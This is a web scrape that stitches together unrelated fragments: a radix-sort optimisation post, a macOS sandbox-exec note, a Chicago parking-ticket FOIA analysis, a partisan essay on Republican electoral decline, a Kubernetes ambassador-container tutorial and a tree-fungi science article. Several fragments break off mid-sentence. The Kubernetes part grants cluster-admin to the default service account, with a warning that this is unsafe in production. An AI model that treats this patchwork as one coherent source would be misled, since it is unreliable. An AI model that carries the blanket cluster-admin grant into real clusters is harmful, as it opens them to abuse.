<p>At some point during development of the simplifier repeated profiling of various meshes showed that a lot of time is being spent in <code>std::sort</code>. Now, <code>std::sort</code> isn’t the fastest sorting algorithm, but it’s generally extremely competitive with custom implementations and it’s hard to beat without changing the problem around. In my case, sorting was used on an array of edge collapses, with the sort key being a floating point error value - so the natural instinct is to use a 3-pass radix sort, using 11, 11 and 10 bits of the key in each pass. However, there’s an interesting alternative available to us here - we can do radix sort in a single pass, using an 11 bit key<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>.</p>

<p>What happens is that we have a 32-bit non-negative floating point value; if we take the top 12 bits and ignore the topmost one (since that’s a sign bit and is always 0), we get 11 bits that represent 8 bits of exponent and 3 bits of mantissa, which essentially gives us a value of similar magnitude but a significant round-off error. If we sort using this value as a key, as a result the sorting sequence isn’t going to be perfectly ordered with respect to the full 32-bit key. However, in our case we need to sort to be able to process better edge collapses first based on a heuristic - and the heuristic is a gross approximation so the extra error our sorting introduces is not noticeable. This technique is surprisingly useful in other domains where you don’t necessarily need an exact order either. A benefit of a single-pass radix sort is that it’s faster (you only need to do one pass over the data instead of 3!) and simpler to implement than a full-blown radix sort, taking just 36 lines of code<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>.</p>

<p>This time the gains in compilation times are somewhat more modest. We’ve removed <code>&lt;algorithm&gt;</code> header but it doesn’t seem so have had very significant benefits to compilation time - we’re still including <code>&lt;vector&gt;</code> and it’s possible that large STL headers are pulled by both. However, the effects on performance are very significant, especially on debug performance in libstdc++ (most likely <code>std::sort</code> is very slow in debug there) but the gains in release builds are also exciting. What is not obvious from this graph is that sorting got so much faster that it almost completely disappeared from the profiles compared to the other work - the entire algorithm runs “just” 1.35x faster, but the gains measured on just the sorting code are much larger, 117 ms -&gt; 10 ms in release builds.</p>



<p>One number that we haven’t moved substantially yet is the time it takes to run this code in debug using MSVC. While it’s natural to expect unoptimized builds to be slower than optimized, they have to be fast enough. Sometimes you want to debug your problem on a non-trivial input dataset. Sometimes you want to run the debug build with full checks through your tests to make sure they don’t trigger any bugs that could disappear in release. Sometimes you are trying to debug a different part of the program, but you still need to run the rest of it. Programmers creatively come up with many workarounds that make the problem less severe - you can make special builds that enable some optimizations but not all, you can use mixed optimization settings for different projects, you can use <code>#pragma optimize</code> to temporarily disable optimizations around offending parts of the code - but all of these seem like duct-tape. Let’s try to replace the only STL component we’re still using, …</p></div></div>

    <time>25th October 2020</time>
    <p>It isn’t widely advertised, but macOS ships with a standalone sandboxing utility out of the box: <code>sandbox-exec</code>. While the very short manpage says the utility has been marked deprecated, and for quite a few major releases now, it’s used heavily by internal systems so it’s unlikely go away anytime soon.</p>

<p>Sandbox configurations are writen in a subset of Scheme. A minimal useful starter example for wrapping a modern application might look something like this:</p>

<div><div><pre><code><span>(</span><span>version</span> <span>1</span><span>)</span>
<span>;; Disallow everything by default</span>
<span>(</span><span>deny</span> <span>default</span><span>)</span>

<span>;;</span>
<span>;; This system profile grants access to a number of things, such as:</span>
<span>;;</span>
<span>;;  - locale info</span>
<span>;;  - system libraries (/System/Library, /usr/lib, etc)</span>
<span>;;  - access to to basic tools (/etc, /dev/urandom, etc)</span>
<span>;;  - Apple services (com.apple.system, com.apple.dyld, etc)</span>
<span>;;</span>
<span>;; and more, see bsd.sb and system.sb in the corresponding directory.</span>
<span>;;</span>
<span>(</span><span>import</span> <span>"/System/Library/Sandbox/Profiles/bsd.sb"</span><span>)</span>
</code></pre></div></div>

<p>Saving the above as <code>config.sb</code>, you can use it to sandbox an app as follows:</p>

<div><div><pre><code><span>$ </span>sandbox-exec <span>-f</span> config.sb /Applications/Foo.app/Contents/MacOS/Foo
</code></pre></div></div>

<p>To see all the operations that were denied, open Applications → Utilities → Console and search for <code>sandbox</code> and the application name. Historically, you could use the <code>(trace "output")</code> command, but this seems dysfunctional on the latest macOS.</p>

<p>Most modern applications will not function with such limited permissions, so expect some back and forth before your sandbox profile works.</p>

<p>Depending on your OS version, you can find some system sandbox examples in some of the following locations:</p>
<ul>
  <li><code>/Library/Sandbox/Profiles</code></li>
  <li><code>/System/Library/Sandbox/Profiles</code></li>
  <li><code>/usr/share/sandbox</code></li>
</ul>

<p>The tool has virtually no official documentation so some hacker insight can come very handy. There’s a number of useful examples here:</p>

</ul>

<p>Setting up a Sandbox from scratch can often be largely trial and error — disallow everything, and then follow the trail of errors to see what you need to enable as a bare minimum to make the app work.</p>

<p>On the upside, it’s a great way to gain insight into what closed source binaries are trying to do on your system.</p>

Using FOIA Data and Unix to halve major source of parking tickets

<h3>Intro</h3>

<p>This'll be my first blog post on the internet, ever. Hopefully it's interesting and accurate. Please point out any mistakes if you see any!</p>

<p>In 2016, I did some work in trying to find some hotspot areas for parking tickets to see if a bit of data munging could reduce those area's parking tickets. In the end, I only really got one cleaned up, but it was <em>one of</em> the most-ticketed spots in all of Chicago and led to about a 50% reduction in parking tickets.</p>

<p>Here's a bit of that story.</p>

<h3>Getting the data through FOIA:</h3>

<p>The system Chicago uses to store its parking tickets is called CANVAS. It's short for "City of Chicago Violation, Noticing and Adjudication Business Process And System Support" [sic] and managed by IBM.  Its most recent contract started in 2012, expires in 2022, and has a pricetag of over $190 million.</p>

<p>Most of Chicago's contracts and their Requests For Procurement (RFP) PDFs are published online. In CANVAS's contracts it gives a fair amount of info on CANVAS's backend infrastructure, including the fact that it uses Oracle 10g. In other words, a FOIA request can be fulfilled by IBM running some simple SQL. </p>

<p><a href="https://www.cityofchicago.org/content/dam/city/depts/dps/ContractAdministration/Specs/2011/Spec92488II.pdf">CANVAS Technical Spec</a>
<br><a href="https://data.cityofchicago.org/Administration-Finance/CANVAS/sbf2-65yk/data">CANVAS Contract</a>
<br><a href="http://ecm.cityofchicago.org/eSMARTContracts/service/DPSWebDocumentViewer?id={C8B55BB4-16F1-4941-B140-CAEA322CFFCD}&amp;osName=eContentContracts&amp;el=0&amp;image=image">CANVAS Request For Procurement (RFP) and Contract</a></p>

<p>With that information at hand, and a couple failed FOIA requests later, I sent this request to get the parking ticket data from Jan 1, 2009 to Mar 10, 2016:</p>

<p><em>"Please provide to me all possible information on all parking tickets between 2009 and the present day. This should include any information related to the car (make, etc), license plate, ticket, ticketer, ticket reason(s), financial information (paid, etc), court information (contested, etc), situational (eg, time, location), and photos/videos.  Ideally, this should also include any relevant ticket-related information stored within CANVAS.</em></p>

<p><em>[...]</em></p>

<p><em>This information will be used for data analysis for research.</em></p>

<p><em>Thanks in advance,</em></p>

<p><em>Matt Chapman"</em></p>

<h3>Data</h3>
<p>About a month later, a guy named Carl (in a fancy suit), handed me a CD with some <em>extremely</em> messy data in a semicolon delimited file named <code>A50462_TcktsIssdSince2009.txt</code>. The file had info on 17,806,818 parking tickets and spans from Jan 1, 2009 to Mar 10, 2016.</p>

<p>The data itself looks like this:</p>

<pre><code>head -5 A50462_TcktsIssdSince2009.txt

</code></pre>

<h4>Some things to note about the data:</h4>

<ol>
<li>The file is semicolon delimited.</li>
<li>Each address is hand typed on a handheld device, often with gloves.</li>
<li>There are <em>millions</em> of typos in the address column. Including over 50,000 semicolons!</li>
<li>There is no lat/lon.</li>
</ol>

<p>What that amounts to is an extremely, extremely messy and unpredictable dataset that's incredibly to difficult to accurately map to lat/lon, which is needed for any sort of comprehensive GIS analysis.  There are a bunch of geocoder services that can help out here, but most of them have about a 50% accuracy rate. That said, with the help of a bit of scrubbing, that number can be boosted to closer to 90%. Another post for another time.</p>

<p>Here’s a sample list of Lake Shore Drive typos:</p>

<pre><code>Laks Shore Dr
Lawkeshore Dr West
Lkaeshore Dr
Lkae Shore Dr
Lkae Shore Drive
Lkaeshore Dr West
</code></pre>

<h3>Original Analysis</h3>

<p>I was particularly interested in finding areas that had hotspot areas that stood out. A lot of my time was spent just throwing hacky code at the problem and eventually wrote out two series of (hacky) commands that led to identifying a potentially fixable spot.</p>

<p>Originally, the work and analysis I was doing was with a combination of unix commands and gnuplot. Since then, I've migrated my code to python + matplotlib + SQL. But, for the sake of this blog, I wanted to show the original analysis.</p>

<p>Get count of tickets at addresses and ignoring first two digits:</p>

<pre><code>$ mawk -F';' '{print $7}' all_tickets.orig.txt
    | sed -r 's/^([0-9]*)[0-9][0-9] (.*)/\100 \2/'
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort | uniq -c | sort -nr

  79320 1900 W OGDEN
  <b>60059 1100 N STATE</b>
  50594 100 N WABASH
  44503 1400 N MILWAUKEE
  43121 1500 N MILWAUKEE
  43030 2800 N BROADWAY
  42294 2100 S ARCHER
  42116 1900 W HARRISON
</code></pre>

<p>Get count of tickets, by ticket type, at specific addresses:</p>

<pre><code>$ mawk -F';' '{print $9,$7}' A50462_TcktsIssdSince2009.txt
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort --parallel=4 | uniq -c | sort -nr

12510 EXPIRED PLATES OR TEMPORARY REGISTRATION 5050 W 55TH
 9636 PARKING/STANDING PROHIBITED ANYTIME 835 N MICHIGAN
 8943 EXPIRED PLATES OR TEMPORARY REGISTRATION 1 W PARKING LOT A
 6168 EXPIRED PLATES OR TEMPORARY REGISTRATION 1 W PARKING LOT E
 5938 PARKING/STANDING PROHIBITED ANYTIME 500 W MADISON
 <b>5663 PARK OR STAND IN BUS/TAXI/CARRIAGE STAND 1166 N STATE</b>

 4137 REAR AND FRONT PLATE REQUIRED 1 W PARKING LOT A
</code></pre>

<p>Both bits of code roughly show that there's something going on at 1100N state street, and 1166 N State St looks particularly suspicious..</p>

<p>So, have a look at the original set of signs:</p>

<center><img src="https://mchap.io/assets/2016signs.png"></center>

<p>Things going on that make this spot confusing:</p>

<ol>
<li>This is a taxi stand from 7pm to 5am for three cars’ lengths. Parking in a taxi stand is a $100 ticket.</li>
<li>When this spot isn’t a taxi stand, it’s metered parking – for a parking meter beyond an alleyway.</li>
<li><a href="https://mchap.io/assets/parkingreceipt.jpg">It’s possible to pay for parking here after 7pm</a>, which makes it look like parking is acceptable – especially with the “ParkChicago” sign floating there.</li>
<li>Confusion creates more confusion – if one car parks there, then more cars follow. Cha-ching.</li>
</ol>

<h3>Contacting the 2nd Ward</h3>

<p>With all that in mind, I contacted the second ward’s alderman’s office on April 12 explaining this, and got back this response:</p>

<p><em>"Hello Matt,</em></p>

<p><em>[…]The signs and the ordinance are currently being investigated.</em></p>

<p><em>In the interim, I highly recommend that you do not park there to avoid any further tickets.</em></p>

<p><em>Lisa&nbsp;Ryan</em></p>

<p><em>Alderman Brian Hopkins - 2nd&nbsp;Ward"</em></p>

<h3>The Fix</h3>

<p>On 1/11/17 I received this email from Lisa:</p>

<p><em>"Matt,</em></p>

<p><em>I don't know if you noticed the additional&nbsp;signage installed&nbsp;on State Street at the 3 Taxi Stand.</em></p>

<p><em>This should elevate [sic] any further confusion of vehicle parking.</em></p>

<p><em>Thank you for your patience.</em></p>

<p><em>Lisa Ryan"</em></p>

<p>Sure enough, two new signs were added!</p>

<center><img src="https://mchap.io/assets/new_signs.png"></center>

<p>The new taxi stand sign sets a boundary for a previously unbounded taxi stand. The No Parking sign explicitly makes it clear that parking here during taxi stand hours is a fineable offense. Neat!</p>

<p>And then there's this guy:
</p><center><img src="https://mchap.io/assets/thisguy.png"></center>

<h3>Results</h3>

<p>I recently decided to look at the number of tickets at that spot. Armed with a new set of data from another FOIA request, I did some analysis with python, pandas, and SQL. What I found is that the addition of a new sign effectively led to a 50% reduction in parking tickets between 1150 and 1200 N State St. Adding it all up, that's about 400 tickets fewer in 2017 and 200 so far in 2018 compared to 2016. All in all, that's about $60,000 worth in parking tickets!</p>

<p>The drop in slope to about 50% matches perfectly with Lisa’s email:</p>

<center><img src="https://mchap.io/assets/plot_fullcumsum.png"></center>

<p>And then comparing 2016 to 2017:
</p><center><img src="https://mchap.io/assets/plot_splitbyyear.png"></center>

<h3>What's next?</h3>

<p>All in all, the number of parking tickets is going up in Chicago, and this work shows that <em>something</em> can be done, even if small.</p>

<center><img src="https://mchap.io/assets/plot_fulldatasetcumsum.png"></center>

<p>This work is only on one small section of road, but I'm convinced that similar work can be on a systematic scale. It's mostly just a matter of digging through data and working directly with each ward.</p>

<p>The later analysis done here was also only done on the most recent dataset that the Department of Revenue they gave me. The two datasets have a different set of columns, so the two datasets need to be combined still. I hope to accomplish that soon! </p>

            <p>By Jeremiah Lee</p>

            <p>Since 2016, the Trump administration has harmed nearly every institution that ever made America great. I understand why Americans and people around the world feel despair. I have felt it on occasion too. But when I look at how Trump got to the White House, US population trends, and the unrest of voters today, I am convinced we should be optimistic. <mark>The Republican party is on its deathbed and Donald Trump is its last burp of hope.</mark></p>

        <h2>Republicans can no longer win national popular votes.</h2>
    </section>
    <section>
        <div>
            <p>In the 5 presidential elections of this millennium, the Republican presidential candidate won the popular vote only once.<sup><a id="fnl-1" href="#fn-1">1</a></sup> Senators McCain and Romney were quintessential Republican presidential candidates, but lost in 2008 and 2012 respectively.</p>
            <p>The 2016 Republican presidential primary showed a party with no apparent leader. A Vaudevillian performance of no-names jabbed each other in hope Americans would like their clown punch best. Pundits changed their top prediction every week. Republican primary voters split their votes across the many unremarkable candidates. That a reality tv show host would win a nomination contest of no substance with a mere plurality—not majority—of the primary votes should not have surprised us.</p>
            <p>Instead, the surprise of the 2016 presidential election was that Donald Trump secured the presidency while losing the popular vote. An electoral college/popular vote split had happened only 4 times in US history, just once since the 1800s and even then required an unprecedented circumstance. George W Bush only won the Electoral College vote in 2000 because the US Supreme Court allowed Florida to certify its results before the state’s recount completed. When the non-binding recount concluded, Governor Bush had actually lost both the popular and Electoral College votes.<sup><a id="fnl-2" href="#fn-2">2</a></sup></p>
            <p>The 2016 presidential election was not a national contest. The result was determined by 3 states that had a margin less than 1% in favor of Trump. While Secretary Hillary Clinton received over 2.8 million more votes nationally, Trump received ~80,000 more votes collectively in Pennsylvania, Michigan, and Wisconsin to win the Electoral College.<sup><a id="fnl-3" href="#fn-3">3</a></sup></p>
            <p>Trump’s antics excited a political party that had lacked energy for decades, but it did not increase voter turnout in his favor. He received around the same number of votes in these states as Governor Romney in 2012 and Senator McCain in 2008. His methods, however, were still effective for him.</p>
            <p>Despite an increase in eligible voters, the total number of votes cast in Michigan and Wisconsin declined and the decrease in voter turnout almost exclusively affected Secretary Clinton. <mark>Many of the people who voted for President Obama in these states simply did not vote for <em>anyone</em> in 2016.</mark> Donald Trump’s lying and misdirection did not increase support for his candidacy, but he did convince enough Americans to not vote against him.</p>
            <p>It’s quite possible Trump will win another Electoral College victory using these same techniques to amplify Democrat-leaning voters’ feelings of disappointment with yet another centrist nominee. The good news is that the 22nd Amendment to the US Constitution prevents Trump from running a third time, not destroying the country is in his economic interest, and he is an unrepeatable anomaly within the Republican Party.</p>
            <p>For a Republican to succeed Trump, they will need to negatively affect Democrat-leaning voter turnout. None of the other 2016 Republican presidential primary candidates were willing to win by using outright lies and divisiveness. Even after his election, most Republican elected officials distanced themselves from Trump while supporting his policies. But suppose there were a Republican candidate willing to imitate Trump’s tactics. Trump’s lies about his opposition depend on his believability as a successful businessman, tell-it-like-it-is arbiter of truth, and Washington outsider. As of late 2020, there are no potential candidates in the Republican party who could follow Trump’s act. He is a closer and the party is over.</p>

        <h2>Demographic changes are aligned with Democrats.</h2>

        <div>
            <p><strong>The narrow margins that currently make an Electoral College victory for Republicans possible will be obliterated by 3 trends.</strong> White Baby Boomers living in rural areas represent the majority of Republican-leaning voters today.<sup><a id="fnl-4" href="#fn-4">4</a></sup> The Republican party is failing to appeal to younger generations, ethnic and racial minorities, and people living in urban areas.</p>

            <h3>1. In 2019, Millennials overtook Baby Boomers to become the nation’s largest living adult generation.<sup><a id="fnl-5" href="#fn-5">5</a></sup></h3>
            <p>Pew Research Center found “most Millennials have ‘consistently liberal’ or ‘mostly liberal’ views,” and that their liberal leaning is strengthening over time. The generational divide is observable on nearly every issue.</p>
            <p>The vast majority of Millennials believe:<sup><a id="fnl-6" href="#fn-6">6</a></sup> </p>
            <ul>
                <li>the federal government has a responsibility to provide healthcare to everyone</li>
                <li>diplomacy is the best way to ensure peace</li>
                <li>the country needs to continue making changes to give Blacks equal rights</li>
                <li>immigrants strengthen the country</li>
                <li>LGBTQ people deserve equality</li>
                <li>human-caused climate change demands action</li>
                <li>abortion and marijuana should be legal</li>
                <li>gun control is more important than gun ownership</li>
            </ul>
            <p>The World Economic Forum reported that the top 3 issues for Millennials are climate change, large scale conflict/wars, and income inequality.<sup><a id="fnl-7" href="#fn-7">7</a></sup> These issues have been part of the last 5 Democratic presidential platforms, whereas the Republican platforms emphasized longstanding wedge issues like gun ownership, abortion, and “the war on terror” over substantive policy changes.</p>
            <p><mark>Republicans have a challenge in reconciling their current positions with the generation that started adulthood protesting with Occupy Wall Street, Black Lives Matter, and the Women’s March</mark>. If Republicans are planning to adapt to the reality of aging Baby Boomers and the also liberal Gen Z coming of voting age, such plans are not yet evident.</p>

            <h3>2. Pluralism is increasing in America.</h3>
            <p>While the majority of white voters identify with the Republican Party, they are a shrinking percentage of the electorate. <mark>Over half of the next generation of Americans is multi-racial.</mark> In 2020, no single race had greater than 50% representation in the child population for the first time in US history.<sup><a id="fnl-8" href="#fn-8">8</a></sup></p>
            <p>The Hispanic American population alone is expected to increase from 19% today to 30% by 2050.<sup><a id="fnl-9" href="#fn-9">9</a></sup> Texas and Arizona will be over 40% Hispanic American by then, making it similar to New Mexico today, which primarily elects Democrats. Both states will flip to Democrats sooner than later.</p>
            <p>In Arizona, the Hispanic American population has been growing for decades. Within that growth are two trends: more Hispanic Americans are reaching voting age and participation of eligible voters is increasing.<sup><a id="fnl-10" href="#fn-10">10</a></sup> Now, Arizona is a swing state. While a Democratic presidential candidate has not won Arizona this millennium, the Republican victory margin has steadily decreased. In 2018, Democrats won 4 statewide races for the first time in a decade. Now, Biden has held a narrow polling advantage over Trump since mid-March<sup><a id="fnl-11" href="#fn-11">11</a></sup> and Democrat Mark Kelly is predicted to win the late Republican John McCain’s Senate seat.<sup><a id="fnl-12" href="#fn-12">12</a></sup></p>
            <p>In Texas, the 2018 elections also revealed the start of a leftward swing. A Democrat has not held a Texas federal Senate seat since 1993, but incumbent Republican Senator Ted Cruz came within 2 percentage points of losing to Democrat Beto O’Rourke. Other races reached a tipping point. Democrats gained 2 federal House seats, 1 state Senate, and 12 state House seats. If the voting pattern with the current demographic patterns continues, Democrat-leaning voters will be the majority in the state within the next 2 presidential elections. Texas, as the nation’s second-largest state, has the second most Electoral College votes. Without it, Republicans have no victory path to win the presidency.</p>

            <h3>3. Blue cities <span>in red states</span> are growing disproportionately.</h3>
            <p>The fastest growing US cities are in states Trump won in 2016. Birthrate alone does not account for the increase. Much of growth comes from Millennial migration. With cities like New York City, Los Angeles, San Francisco, Chicago, and Boston already at high density, the growth has been concentrated in cities that had space to grow.</p>
            <p>Cities historically have been more liberal than rural areas. Twice as many urban voters affiliate with Democrats compared to Republicans.<sup><a id="fnl-13" href="#fn-13">13</a></sup> Even Republicans in urban areas are more left leaning. For example, nearly twice as many Republicans in urban areas felt legal same-sex marriage was a good thing compared to Republicans in rural areas.<sup><a id="fnl-14" href="#fn-14">14</a></sup></p>
            <p>Urban counties are now growing 4 times faster than rural counties.<sup><a id="fnl-15" href="#fn-15">15</a></sup> The effect of city population surpassing the rural population in a state can be observed in Democrats’ improved performance in Georgia and North Carolina state-wide elections.</p>
            <p>Georgia’s population has increased by more than 300,000 since 2016. The counties that voted for Secretary Clinton have grown nearly twice as much.<sup><a id="fnl-16" href="#fn-16">16</a></sup> In 2018, Democrats received 49% of the vote in state elections for governor, attorney general, and secretary of state.<sup><a id="fnl-17" href="#fn-17">17</a></sup> Voters who had lived in Georgia less than a decade comprised 11% of the vote and 65% of them voted for Democrat governor candidate Stacey Abrams.<sup><a id="fnl-18" href="#fn-18">18</a></sup> Georgia is nearing a tipping point.</p>
            <p>North Carolina may have plenty of gun shops and odes to the Antebellum era, but it also has …</p></div></section></section></article></div>

Each container should serve a single purpose and any task that can be separated to another container – should be.</p><p>In Kubernetes, the Pod definition gives us an added possibility for abstraction. If two containers tasks are strongly coupled, or in case you can benefit from containers sharing resources (e.g., network namespace), then these should be under the same Pod.</p><p>The name “ambassador” actually describes what it does very well. Also known as <strong>ambassador proxy</strong>, the ambassador pattern main purpose is to simplify access to other services.  You may have also heard the term <em>sidecar container</em>, these share some similarities, but without diving into details – the ambassador container is a sidecar sub-type.</p><figure><img width="984" height="277" src="https://dev.bitolog.com/wp-content/uploads/2020/09/ambassador-container.png" alt="A pod that's built of 2 containers: main and ambassador.

The ambassador container contacts services on behalf of the main container</span></p><h2>Localhost</h2><p>Since containers under the same pod share the same <strong>network namespace</strong> they can communicate with each other using <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Localhost" target="_blank">localhost</a> (the loopback interface). This is great, since now your main application container does not need to know where or how to access any other service besides the ambassador container.</p><p>Any access to other service(s) and the logic required to do so are encapsulated within the ambassador container.</p><p>So now the ambassador container will take care of connecting to other services – authentication, connection persistency, retries, handling unexpected replies and relevant configurations related to external services communications.</p><p>As a developer, this is also great since as your application grows, this can help you to separate responsibilities between people or teams. A specific team can be dedicated to maintaining your service discovery container while the main application teams need not knowing how to access any other service(s).</p><p>In order to show you how ambassador containers actually work – let’s take a look at a Kubernetes native application example.</p><h2>Kubectl Proxy</h2><p>Let’s assume that your main application needs to communicate with the Kubernetes API server directly. If you ever tried doing so, soon you find out that you need to take care of authentication, encryption and server verification. For this problem, kubectl proxy is a great solution.</p><p><a href="https://kubernetes.io/docs/tasks/extend-kubernetes/http-proxy-access-api/" target="_blank" rel="noreferrer noopener">Kubectl proxy</a> is an HTTP proxy access to the Kubernetes API. Your main application communicates with it via HTTP and it handles the HTTPS connection to the API server.</p><p>So for this example, you will deploy kubectl proxy as an ambassador container. The main container will communicate with it by using HTTP on localhost and let it handle security transparently.</p><figure><img width="908" height="259" data-src="https://dev.bitolog.com/wp-content/uploads/2020/09/ambassador-k8s.png" alt="The main container contacts the kubectl proxy via HTTP on localhost, and the kubectl proxy then communicates with the API server using HTTPS

This volume contains everything needed to securely talk to the Kubernetes API server from within a pod.</p><p>Your kubectl proxy ambassador container will use this volume in order to communicate with the API server. You will see how in a minute.</p><h2>Kubectl Proxy Ambassador Container</h2><p>Disclaimer: the following example in its original form is part of the awesome book <a rel="noreferrer noopener" href="https://www.manning.com/books/kubernetes-in-action" target="_blank">Kubernetes In Action</a>, which I highly recommend!</p><p>The Dockerfile below is the one that creates your kubectl proxy ambassador container image.</p><p>All it does, as you can see, is downloading the v1.19 Kubernetes client tarball and extract it to the root folder.</p><p>Other than that, it also adds as an entrypoint a script (<code>kubectl-proxy.sh</code>), which is explained below:</p><pre><code lang="docker">FROM alpine

RUN apk update &amp;&amp; \
	apk add curl &amp;&amp; \
	curl -L -O https://dl.k8s.io/v1.19.0/kubernetes-client-linux-amd64.tar.gz &amp;&amp; \
	tar zvxf kubernetes-client-linux-amd64.tar.gz kubernetes/client/bin/kubectl &amp;&amp; \
	mv kubernetes/client/bin/kubectl / &amp;&amp; \
	rm -rf kubernetes &amp;&amp; \
	rm -f kubernetes-client-linux-amd64.tar.gz

ADD kubectl-proxy.sh /kubectl-proxy.sh

ENTRYPOINT /kubectl-proxy.sh</code></pre><p>The entry point <code>kubectl-proxy.sh</code> script is detailed here:</p><pre><code lang="bash">#!/bin/sh

API_SERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
CA_CRT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
TOKEN="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

/kubectl proxy --server="$API_SERVER" --certificate-authority="$CA_CRT" --token="$TOKEN" --accept-paths='^.*'</code></pre><p>Note that you can find instructions on how to build such command as part of the <a href="https://kubernetes.io/docs/tasks/administer-cluster/access-cluster-api/#without-using-a-proxy" target="_blank" rel="noreferrer noopener">official documentation</a>.</p><p>As mentioned previously, you can see that this script assumes the existence of the default token secret volume. It passes these as arguments to the kubectl proxy command in order for it to authenticate in front of the API server.</p><p>All that’s left for you to do is build this image and upload it to a container registry. In a folder that contains both the Dockerfile and the script, run the following commands:</p><p><strong>Note: </strong>I used my own public dockerhub account, you need to change the registry and repository to your own.</p><pre><code lang="vim">$ docker build . -t omrizzy/ambassador:1.0
...
Successfully built 954821c22f41
Successfully tagged omrizzy/ambassador:1.0

$ docker push omrizzy/ambassador:1.0
...
1.0: digest: sha256:dad59..5aae81b84dad49dc7c4 size: 947</code></pre><h2>The Pod Manifest</h2><p>Now that you have a kubectl proxy container, you need to create a manifest in order to apply it to your cluster.</p><p>As a main application container, you’ll just use a container which contains the <code><a rel="noreferrer noopener" href="https://curl.haxx.se/" target="_blank">curl</a></code> command. To keep the container running, its main process is set to <code>sleep</code> with a very long timer. You’ll use the curl binary in order to validate your setup. Of course, this container can be replaced with any other, this setup was used purely as an example.</p><pre><code lang="yaml">apiVersion: v1
kind: Pod
metadata:
  name: curl-with-ambassador
spec:
  containers:
  - name: main
    image: tutum/curl
    command: ["sleep", "9999999"]
  - name: ambassador
    image: omrizzy/ambassador:1.0</code></pre><p>Save the above snippet to a file named <code>ambassador.yaml</code>. I will be applying it to my local cluster installed using <code>kubeadm</code>. Since creating a cluster is not part of this blog post, you can follow the instructions under the <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/" target="_blank" rel="noreferrer noopener">official documentation</a>.</p><pre><code lang="bash">$ kubectl apply -f ambassador.yaml
pod/curl-with-ambassador created</code></pre><p>Validate that both of our containers are running under the pod:</p><pre><code lang="bash">$ kubectl get pods
NAME                   READY   STATUS    RESTARTS   AGE
curl-with-ambassador   2/2     Running   0          9s</code></pre><p>Good job! now let’s see how we can use our setup and talk to the API server via the ambassador container.</p><h2>Talking To The API Server</h2><p>First, let’s exec into our main application container:</p><pre><code lang="bash">$ kubectl exec -it curl-with-ambassador -c main -- bash</code></pre><p>Kubectl proxy default port is <strong>8001</strong>, so let’s send a request to the API server and check it out:</p><pre><code lang="bash">$ root@curl-with-ambassador:/# curl localhost:8001
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:serviceaccount:default:default\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}</code></pre><p>Well, this doesn’t look good. The source of this issue is that by default, Kubernetes has <code>RBAC</code> control enabled. This results in the service account not being authorized to access the API server.</p><p>If you want to learn more about RBAC (Role-Based Access Control), you can do that via the <a rel="noreferrer noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/" target="_blank">official documentation</a>. If you want me to write a blog post about RBAC, leave a comment in the comments section below or <a href="https://dev.bitolog.com/contact/" target="_blank" rel="noreferrer noopener">contact me</a>.</p><p>For now, we’re going to grant all service accounts cluster-admin privileges:</p><pre><code lang="bash">$ kubectl create clusterrolebinding default-admin --clusterrole cluster-admin --serviceaccount=default:default</code></pre><p><span><strong>Warning: </strong>this command is not safe for production clusters! for our simple introduction it’s perfectly fine.</span></p><p>Now let’s try reaching the API server again:</p><pre><code lang="bash">$ root@curl-with-ambassador:/# curl localhost:8001

Now a new University of Alberta study is showing the same goes for trees, thanks to their underground neighbours. The study, published in the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fbesjournals.onlinelibrary.wiley.com%2Fdoi%2F10.1111%2F1365-2745.13507&amp;t=MDBiMzM5NGFiYzIxMmExYzRmMDM2MjhjMjUxZGRjZmNmZGY1MjIyOCxpR0xueFpVNQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632982799643705344%2Fsoil-fungi-support-trees&amp;m=0&amp;ts=1603946212"><i>Journal of Ecology</i></a>, is the first to show that the growth of adult trees is linked to their participation in fungal networks living in the forest soil.</p><p>Though past research has focused on seedlings, these findings give new insight into the value of fungal networks to older trees—which are more environmentally beneficial for functions like capturing carbon and stabilizing soil erosion.</p><p>“Large trees make up the bulk of the forest, so they drive what the forest is doing,” said researcher Joseph Birch, who led the study for his PhD thesis in the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.ualberta.ca%2Findex.html&amp;t=YzJlMDY0ZDRiYThiMDQzODA2NmQ2NTZkMmU3OWJiMmEyZTkyOWY1MCxpR0xueFpVNQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632982799643705344%2Fsoil-fungi-support-trees&amp;m=0&amp;ts=1603946212">Faculty of Agricultural, Life &amp; Environmental Sciences</a>.</p><p>When they colonize the roots of a tree, fungal networks act as a sort of highway, allowing water, nutrients and even the compounds that send defence signals against insect attacks to flow back and forth among the trees.</p><p>The network also helps nutrients flow to resource-limited trees “like family units that support one another in times of stress,” Birch noted.</p><p>Cores taken from 350 Douglas firs in British Columbia showed that annual tree ring growth was related to the extent of fungal connections a tree had with other trees. “They had much higher growth than trees that had only a few connections.”</p><p>The research also showed that trees with more connections to many unique fungi had much greater growth than those with only one or two connections.</p><p>“We found that the more connected an adult tree is, the more it has significant growth advantages, which means the network could really influence large-scale important interactions in the forest, like carbon storage. If you have this network that is helping trees grow faster, that helps sequester more carbon year after year.”</p><p>It’s also possible that if the trees grow faster, they’d have some ability to better survive drought that is expected to intensify with climate change, he added.</p><p>“These networks may help them grow more steadily even as conditions become more stressful, and could even help buffer trees against death.”</p><p>Birch hopes his findings lead to further studies in different kinds of forests in other geographical areas, because it’s likely that the connections among trees change from year to year, he said.</p><p>“It’s a very dynamic system that is probably being broken apart and re-formed quite a bit, like family relationships, so we don’t know how they will change under future climates either. Maybe a dry year or a beetle outbreak impacts the 